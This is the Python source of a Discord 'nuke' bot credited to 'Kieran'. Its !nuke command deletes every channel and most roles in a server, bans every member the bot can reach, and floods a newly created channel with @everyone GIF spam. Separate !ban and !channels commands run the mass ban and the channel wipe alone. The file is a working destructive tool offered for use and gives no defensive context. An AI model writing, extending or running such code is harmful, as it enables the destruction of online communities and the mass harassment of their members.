import discord
from discord.ext import commands
import asyncio
import random

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"Bot is ready! Logged in as {bot.user}")
    await bot.change_presence(activity=discord.Game(name="Nuking Servers"))

GIF_URL = "https://media.tenor.com/example.gif"  # REPLACE WITH YOUR ACTUAL GIF DIRECT LINK (e.g. tenor, giphy direct url)

async def spam_gif_in_channel(channel, amount=50):
    message = f"@everyone SPAM SPAM SPAM {GIF_URL} [made by Kieran]"
    for _ in range(amount):
        try:
            await channel.send(message)
            await asyncio.sleep(0.4)
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    guild = ctx.guild
    await ctx.send("🚀 **NUKING SERVER INSTANTLY**... [made by Kieran]")

    # Delete channels faster (parallel + no extra waits)
    delete_tasks = [channel.delete(reason="Nuke") for channel in guild.channels if channel != ctx.channel]
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
    try:
        await ctx.channel.delete(reason="Nuke")
    except:
        pass

    # Delete roles fast
    delete_role_tasks = [role.delete(reason="Nuke") for role in guild.roles if role.name != "@everyone" and role < guild.me.top_role]
    if delete_role_tasks:
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    # Ban all instantly
    ban_tasks = [member.ban(reason="Nuke") for member in guild.members if member != ctx.author and member != guild.me and member.top_role < guild.me.top_role]
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)

    await asyncio.sleep(1)

    # Recreate + instant GIF spam
    try:
        new_channel = await guild.create_text_channel("general", reason="Nuke recreation")
        asyncio.create_task(spam_gif_in_channel(new_channel))  # Start spamming instantly
        await new_channel.send("✅ **SERVER FULLY NUKED + SPAMMING GIF!** [made by Kieran]")
    except:
        pass

    try:
        await guild.create_role(name="Member", reason="Nuke recreation")
    except:
        pass
    print("Full nuke completed! [made by Kieran]")

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx):
    guild = ctx.guild
    await ctx.send("🔨 **BANNING EVERYONE INSTANTLY**... [made by Kieran]")
    ban_tasks = [member.ban(reason="Nuke") for member in guild.members if member != ctx.author and member != guild.me and member.top_role < guild.me.top_role]
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)
    await ctx.send("✅ **Banall completed!** [made by Kieran]")

@bot.command()
@commands.has_permissions(administrator=True)
async def channels(ctx):
    guild = ctx.guild
    await ctx.send("🗑️ **DELETING ALL CHANNELS INSTANTLY**... [made by Kieran]")

    delete_tasks = [channel.delete(reason="Nuke") for channel in guild.channels if channel != ctx.channel]
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
